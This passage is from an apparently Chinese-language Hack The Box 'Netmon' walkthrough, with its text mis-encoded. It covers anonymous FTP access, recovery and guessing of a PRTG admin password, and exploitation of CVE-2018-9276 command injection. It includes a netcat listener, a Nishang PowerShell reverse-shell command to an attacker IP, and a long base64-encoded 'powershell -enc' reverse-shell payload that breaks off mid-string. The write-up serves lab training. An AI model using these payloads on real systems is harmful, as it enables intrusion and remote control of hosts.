Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49668/tcp open  msrpc        Microsoft Windows RPC\n49669/tcp open  msrpc        Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=1/8%OT=21%CT=1%CU=35681%PV=Y%DS=2%DC=T%G=Y%TM=63B9D584\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A\nOS:)OPS(O1=M537NW8ST11%O2=M537NW8ST11%O3=M537NW8NNT11%O4=M537NW8ST11%O5=M53\nOS:7NW8ST11%O6=M537ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000\nOS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M537NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+\nOS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T\nOS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0\nOS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S\nOS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R\nOS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N\nOS:%T=80%CD=Z)\n\nNetwork Distance: 2 hops\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -1s, deviation: 0s, median: -2s\n| smb2-time: \n|   date: 2023-01-07T20:26:34\n|_  start_date: 2023-01-07T20:23:08\n| smb-security-mode: \n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   311: \n|_    Message signing enabled but not required\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   648.51 ms 10.10.16.1\n2   397.22 ms 10.10.10.152\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 117.23 seconds\n```\n\n# æ¼æ´åˆ©ç”¨\n\n## Ftp\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ftp 10.10.10.152                         \nConnected to 10.10.10.152.\n220 Microsoft FTP Service\nName (10.10.10.152:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp> ls\n229 Entering Extended Passive Mode (|||49861|)\n125 Data connection already open; Transfer starting.\n02-02-19  11:18PM                 1024 .rnd\n02-25-19  09:15PM       <DIR>          inetpub\n07-16-16  08:18AM       <DIR>          PerfLogs\n02-25-19  09:56PM       <DIR>          Program Files\n02-02-19  11:28PM       <DIR>          Program Files (x86)\n02-03-19  07:08AM       <DIR>          Users\n02-25-19  10:49PM       <DIR>          Windows\n226 Transfer complete.\n```\n\nftp å¯ä»¥ä½¿ç”¨åŒ¿åè´¦æˆ·ç™»å½•ï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€äº›ç›®å½•æ–‡ä»¶\n\n```bash\nftp> pwd\nRemote directory: /users/Public\nftp> ls\n229 Entering Extended Passive Mode (|||49886|)\n125 Data connection already open; Transfer starting.\n02-03-19  07:05AM       <DIR>          Documents\n07-16-16  08:18AM       <DIR>          Downloads\n07-16-16  08:18AM       <DIR>          Music\n07-16-16  08:18AM       <DIR>          Pictures\n01-07-23  03:23PM                   34 user.txt\n07-16-16  08:18AM       <DIR>          Videos\n226 Transfer complete.\nftp> get user.txt\nlocal: user.txt remote: user.txt\n229 Entering Extended Passive Mode (|||49887|)\n125 Data connection already open; Transfer starting.\n100% |**********************************************************************************************************************************************************************|    34        0.05 KiB/s    00:00 ETA\n226 Transfer complete.\n34 bytes received in 00:00 (0.03 KiB/s)\n```\n\nåœ¨ç›®å½• `/users/public` ä¸­æ‰¾åˆ°äº† user.txt æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥ get è¯·æ±‚åˆ°æœ¬åœ°\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# cat user.txt\nd79ce5330dd16fc989a3fbf6e31f5259\n```\n\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n```bash\nftp> get license.rtf\nlocal: license.rtf remote: license.rtf\n229 Entering Extended Passive Mode (|||50056|)\n125 Data connection already open; Transfer starting.\n100% |**********************************************************************************************************************************************************************| 50098       48.91 KiB/s    00:00 ETAftp: Reading from network: è¢«ä¸­æ–­çš„ç³»ç»Ÿè°ƒç”¨\n  0% |                                                                                                                                                                      |    -1        0.00 KiB/s    --:-- ETA\n226 Transfer complete.\nftp> pwd\nRemote directory: /windows/system32\n```\n\nåœ¨ç›®å½• `/windows/system32` ä¸‹æˆåŠŸä¸‹è½½åˆ°äº† license.rtf æ–‡ä»¶ï¼Œå¹¶ä¸”æˆåŠŸä»è¯¥æ–‡ä»¶ä¸­è·å–åˆ°äº†ç³»ç»Ÿç‰ˆæœ¬ `MICROSOFT WINDOWS SERVER 2016 STANDARD AND DATACENTER` \n\næ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« \n\n> [https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)\n\n![](Hackthebox-Netmon/gnSaFdTAsKx3GMATXX2hPvWg-pFjOsYt1r08CcoRXYI.png)\n\nè¯¥æ–‡ç« æ˜¾ç¤º windows server 2016 çš„ RPTG é»˜è®¤å®‰è£…ç›®å½•åœ¨ `programdata` ä¸­ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nftp> cd programdata \n250 CWD command successful.\nftp> cd paessler\n250 CWD command successful.\nftp> ls\n229 Entering Extended Passive Mode (|||50169|)\n125 Data connection already open; Transfer starting.\n01-07-23  03:24PM       <DIR>          PRTG Network Monitor\n226 Transfer complete.\n```\n\nç¡®å®å­˜åœ¨\n\n```bash\nftp> cd \"PRTG Network Monitor\"\n250 CWD command successful.\nftp> ls\n229 Entering Extended Passive Mode (|||50179|)\n150 Opening ASCII mode data connection.\n01-07-23  03:24PM       <DIR>          Configuration Auto-Backups\n01-07-23  03:24PM       <DIR>          Log Database\n02-02-19  11:18PM       <DIR>          Logs (Debug)\n02-02-19  11:18PM       <DIR>          Logs (Sensors)\n02-02-19  11:18PM       <DIR>          Logs (System)\n01-07-23  03:24PM       <DIR>          Logs (Web Server)\n01-07-23  03:24PM       <DIR>          Monitoring Database\n02-25-19  09:54PM              1189697 PRTG Configuration.dat\n02-25-19  09:54PM              1189697 PRTG Configuration.old\n07-14-18  02:13AM              1153755 PRTG Configuration.old.bak\n01-07-23  03:24PM              1632703 PRTG Graph Data Cache.dat\n02-25-19  10:00PM       <DIR>          Report PDFs\n02-02-19  11:18PM       <DIR>          System Information Database\n02-02-19  11:40PM       <DIR>          Ticket Database\n02-02-19  11:18PM       <DIR>          ToDo Database\n```\n\n```bash\nftp> get \"PRTG Configuration.old.bak\"\nlocal: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak\n229 Entering Extended Passive Mode (|||50302|)\n125 Data connection already open; Transfer starting.\n  7% |***********                                                                                                                                                           | 88641       86.52 KiB/s    00:12 ETAftp: Reading from network: è¢«ä¸­æ–­çš„ç³»ç»Ÿè°ƒç”¨\n  0% |                                                                                                                                                                      |    -1        0.00 KiB/s    --:-- ETA\n550 The specified network name is no longer available.\n```\n\nè·å–æ–‡ä»¶ `Configuration.old.bak` \n\n```bash\ngrep -B5 -A5 -i password RPTG\\ Configuration.dat.bak|sed 's/ //g'|sort -u|less\n```\n\nåœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸²ç–‘ä¼¼å¯†ç çš„ç©æ„å„¿\n\n```bash\n<proxyport>\n        PrTg@dmin2018\n<retrysnmp>\n        <!--User:prtgadmin-->\n```\n\n![](Hackthebox-Netmon/XWaUj3RLImW_TQncUdzOSIX1wRBPMW06_1yY0DzvHxk.png)\n\nä½†æ˜¯æ‹¿å» web é¡µé¢ä¸­ç™»å½•å´åˆå¤±è´¥äº†\n\n```bash\n02-25-19  09:54PM              1189697 PRTG Configuration.dat\n02-25-19  09:54PM              1189697 PRTG Configuration.old\n07-14-18  02:13AM              1153755 PRTG Configuration.old.bak\n01-07-23  03:24PM              1632703 PRTG Graph Data Cache.dat\n```\n\nçªç„¶æƒ³åˆ°ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯åœ¨ 2018 å¹´åˆ›å»ºçš„ï¼Œé‚£ä¹ˆä¼šä¸ä¼šæ ¹æ®å¹´ä»½å˜åŒ–å‘¢ï¼Ÿ\n\n```bash\nusername = prtgadmin\npassword = PrTg@dmin2019\n```\n\nå»å°è¯•ä¸€ä¸‹\n\n![](Hackthebox-Netmon/5zRmvoP4x-iAY4rFoU_Gu_h2B6WG9lUtWseXIT1hQJo.png)\n\nniceï¼ŒæˆåŠŸç™»å½•\n\n# æƒé™æå‡\n\n![](Hackthebox-Netmon/JBVXoM1yH0EdoCa_nlWWFOrAMBo8ohOGe0_kX-S5gjY.png)\n\nåœ¨æ‰¾å‚è€ƒæ–‡ç« å’Œæ¼æ´çš„æ—¶å€™ï¼Œå€’æ˜¯é‡åˆ°ä¸ªå°æ’æ›²ã€‚è¿™é‡Œå› ä¸ºæˆ‘çš„èŠ‚ç‚¹æ˜¯ä¿„ç½—æ–¯çš„ï¼Œæœ‰ä¸€äº›æ–‡ç« ç›´æ¥æ— æ³•è®¿é—®ï¼Œç»äº†\n\n> [https://github.com/A1vinSmith/CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276)\n\nåˆç†æ‰¾åˆ°äº†ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„æ¼æ´ä»¥åŠåˆ©ç”¨å·¥å…·\n\nè¿™ä¸ªåŸç†æ˜¯ Netmon åœ¨æ‰§è¡Œé€šçŸ¥è„šæœ¬æ—¶ï¼Œå› ä¸ºæ²¡æœ‰æ‰§è¡Œå‚æ•°æ£€æŸ¥è€Œå¯¼è‡´çš„å‘½ä»¤æ³¨å…¥æ¼æ´\n\nç‚¹å‡» \\`Setup -> Notifications -> Ticket Notification -> Execute Program\n\n![](Hackthebox-Netmon/ySUq7KWmuF5XZxGdmjZ812d5HtABzu1JVHRONiyRtOo.png)\n\nè¿™é‡Œå°±æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„åœ°æ–¹\n\nä½†æ˜¯åœ¨åˆ©ç”¨ä¹‹å‰æˆ‘ä»¬è¦å…ˆåšç‚¹å‡†å¤‡\n\n> [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)\n\né¦–å…ˆä½¿ç”¨ nishang çš„ç¨‹åº\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .\n```\n\nå°†æˆ‘ä»¬éœ€è¦çš„è„šæœ¬å¤åˆ¶åˆ°æœ¬åœ° \n\n```bash\nnc -nvlp 4444\n```\n\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444\n```\n\nå°†ä¸Šé¢çš„è¯­å¥æ·»åŠ åˆ° `Invoke-PowerShellTcp.ps1` çš„æœ€ä¸‹é¢\n\næ¥ç€å°†å†…å®¹è½¬åŒ–ä¸º base64\n\n```bash\ncat Invoke-PowerShellTcp.ps1|iconv -t UTF-16LE|base64 -w0\n```\n\nç„¶åæ„é€ ä¸€ä¸‹æ¶æ„ poc\n\n```bash\ntest|powershell -enc ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAACgB7ACAACgA8ACMACgAuAFMAWQBOAE8AUABTAEkAUwAKAE4AaQBzAGgAYQBuAGcAIABzAGMAcgBpAHAAdAAgAHcAaABpAGMAaAAgAGMAYQBuACAAYgBlACAAdQBzAGUAZAAgAGYAbwByACAAUgBlAHYAZQByAHMAZQAgAG8AcgAgAEIAaQBuAGQAIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAZgByAG8AbQAgAGEAIAB0AGEAcgBnAGUAdAAuACAACgAKAC4ARABFAFMAQwBSAEkAUABUAEkATwBOAAoAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBiAGwAZQAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIABhACAAcwB0AGEAbgBkAGEAcgBkACAAbgBlAHQAYwBhAHQAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAGEAIABwAG8AcgB0ACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAgAAoAQQBsAHMAbwAsACAAYQAgAHMAdABhAG4AZABhAHIAZAAgAG4AZQB0AGMAYQB0ACAAYwBhAG4AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHMAYwByAGkAcAB0ACAAQgBpAG4AZAAgAHQAbwAgAGEAIABzAHAAZQBjAGkAZgBpAGMAIABwAG8AcgB0AC4ACgAKAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABkAGUAcgBpAHYAZQBkACAAZgByAG8AbQAgAFAAbwB3AGUAcgBmAHUAbgAgAHcAcgBpAHQAdABlAG4AIABiAHkAIABCAGUAbgAgAFQAdQByAG4AZQByACAAJgAgAEQAYQB2AGUAIABIAGEAcgBkAHkACgAKAC4AUABBAFIAQQBNAEUAVABFAFIAIABJAFAAQQBkAGQAcgBlAHMAcwAKAFQAaABlACAASQBQACAAYQBkAGQAcgBlAHMAcwAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB3AGgAZQBuACAAdQBzAGkAbgBnACAAdABoAGUAIAAtAFIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAuAAoACgAuAFAAQQBSAEEATQBFAFQARQBSACAAUABvAHIAdAAKAFQAaABlACAAcABvAHIAdAAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB3AGgAZQBuACAAdQBzAGkAbgBnACAAdABoAGUAIAAtAFIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAuACAAVwBoAGUAbgAgAHUAcwBpAG4AZwAgAC0AQgBpAG4AZAAgAGkAdAAgAGkAcwAgAHQAaABlACAAcABvAHIAdAAgAG8AbgAgAHcAaABpAGMAaAAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAgAGwAaQBzAHQAZQBuAHMALgAKAAoALgBFAFgAQQBNAFAATABFAAoAUABTACAAPgAgAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAgAC0AUgBlAHYAZQByAHMAZQAgAC0ASQBQAEEAZABkAHIAZQBzAHMAIAAxADkAMgAuADEANgA4AC4AMgA1ADQALgAyADIANgAgAC0AUABvAHIAdAAgADQANAA0ADQACgAKAEEAYgBvAHYAZQAgAHMAaABvAHcAcwAgAGEAbgAgAGUAeABhAG0AcABsAGUAIABvAGYAIABhAG4AIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcgBlAHYAZQByAHMAZQAgAGMAbwBuAG4AZQBjAHQAIABzAGgAZQBsAGwALgAgAEEAIABuAGUAdABjAGEAdAAvAHAAbwB3AGUAcgBjAGEAdAAgAGwAaQBzAHQAZQBuAGUAcgAgAG0AdQBzAHQAIABiAGUAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAAoAdABoAGUAIABnAGkAdgBlAG4AIABJAFAAIABhAG4AZAAgAHAAbwByAHQALgAgAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBCAGkAbgBkACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABiAGkAbgBkACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAuACAAVQBzAGUAIABhACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHAAbwByAHQALgAgAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBSAGUAdgBlAHIAcwBlACAALQBJAFAAQQBkAGQAcgBlAHMAcwAgAGYAZQA4ADAAOgA6ADIAMABjADoAMgA5AGYAZgA6AGYAZQA5AGQAOgBiADkAOAAzACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAGUAdgBlAHIAcwBlACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAgAG8AdgBlAHIAIABJAFAAdgA2AC4AIABBACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIABsAGkAcwB0AGUAbgBlAHIAIABtAHUAcwB0ACAAYgBlAAoAbABpAHMAdABlAG4AaQBuAGcAIABvAG4AIAB0AGgAZQAgAGcAaQB2AGUAbgAgAEkAUAAgAGEAbgBkACAAcABvAHIAdAAuACAACgAKAC4ATABJAE4ASwAKAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBsAGEAYgBvAGYAYQBwAGUAbgBlAHQAcgBhAHQAaQBvAG4AdABlAHMAdABlAHIALgBjAG8AbQAvADIAMAAxADUALwAwADUALwB3AGUAZQBrAC0AbwBmAC0AcABvAHcAZQByAHMAaABlAGwAbAAtAHMAaABlAGwAbABzAC0AZABhAHkALQAxAC4AaAB0AG0AbAAKAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AbgBlAHQAdABpAHQAdQBkAGUALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AcABvAHcAZQByAGYAdQBuAC4AcABzADEACgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAYQBtAHIAYQB0AGEAcwBoAG8AawAvAG4AaQBzAGgAYQBuAGcACgAjAD4AIAAgACAAIAAgACAACgAgACAAIAAgAFsAQwBtAGQAbABlAHQAQgBpAG4AZABpAG4AZwAoAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAgAFAAYQByAGEAbQAoAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAGYAYQBsAHMAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdAByAGkAbgBnAF0ACgAgACAAIAAgACAAIAAgACAAJABJAFAAQQBkAGQAcgBlAHMAcwAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAxACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAxACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAGIAaQBuAGQAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBJAG4AdABdAAoAIAAgACAAIAAgACAAIAAgACQAUABvAHIAdAAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBTAHcAaQB0AGMAaABdAAoAIAAgACAAIAAgACAAIAAgACQAUgBlAHYAZQByAHMAZQAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAGIAaQBuAGQAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBTAHcAaQB0AGMAaABdAAoAIAAgACAAIAAgACAAIAAgACQAQgBpAG4AZAAKAAoAIAAgACAAIAApAAoACgAgACAAIAAgAAoAIAAgACAAIAB0AHIAeQAgAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACMAQwBvAG4AbgBlAGMAdAAgAGIAYQBjAGsAIABpAGYAIAB0AGgAZQAgAHIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAgAGkAcwAgAHUAcwBlAGQALgAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAUgBlAHYAZQByAHMAZQApAAoAIAAgACAAIAAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABJAFAAQQBkAGQAcgBlAHMAcwAsACQAUABvAHIAdAApAAoAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAEIAaQBuAGQAIAB0AG8AIAB0AGgAZQAgAHAAcgBvAHYAaQBkAGUAZAAgAHAAbwByAHQAIABpAGYAIABCAGkAbgBkACAAcwB3AGkAdABjAGgAIABpAHMAIAB1AHMAZQBkAC4ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAEIAaQBuAGQAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABsAGkAcwB0AGUAbgBlAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgBdACQAUABvAHIAdAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AcwB0AGEAcgB0ACgAKQAgACAAIAAgAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGwAaQBlAG4AdAAgAD0AIAAkAGwAaQBzAHQAZQBuAGUAcgAuAEEAYwBjAGUAcAB0AFQAYwBwAEMAbABpAGUAbgB0ACgAKQAKACAAIAAgACAAIAAgACAAIAB9ACAACgAKACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAFMAZQBuAGQAIABiAGEAYwBrACAAYwB1AHIAcgBlAG4AdAAgAHUAcwBlAHIAbgBhAG0AZQAgAGEAbgBkACAAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUACgAgACAAIAAgACAAIAAgACAAJABzAGUAbgBkAGIAeQB0AGUAcwAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACIAVwBpAG4AZABvAHcAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAHUAbgBuAGkAbgBnACAAYQBzACAAdQBzAGUAcgAgACIAIAArACAAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQAgACsAIAAiACAAbwBuACAAIgAgACsAIAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAArACAAIgBgAG4AQwBvAHAAeQByAGkAZwBoAHQAIAAoAEMAKQAgADIAMAAxADUAIABNAGkAYwByAG8AcwBvAGYAdAAgAEMAbwByAHAAbwByAGEAdABpAG8AbgAuACAAQQBsAGwAIAByAGkAZwBoAHQAcwAgAHIAZQBzAGUAcgB2AGUAZAAuAGAAbgBgAG4AIgApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAIwBTAGgAbwB3ACAAYQBuACAAaQBuAHQAZQByAGEAYwB0AGkAdgBlACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHAAcgBvAG0AcAB0AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlAHMAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAnAFAAUwAgACcAIAArACAAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAAgACsAIAAnAD4AJwApAAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQBzACwAMAAsACQAcwBlAG4AZABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApAAoACgAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABFAG4AYwBvAGQAZQBkAFQAZQB4AHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZABhAHQAYQAgAD0AIAAkAEUAbgBjAG8AZABlAGQAVABlAHgAdAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBFAHgAZQBjAHUAdABlACAAdABoAGUAIABjAG8AbQBtAGEAbgBkACAAbwBuACAAdABoAGUAIAB0AGEAcgBnAGUAdAAuAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAEkAbgB2AG8AawBlAC0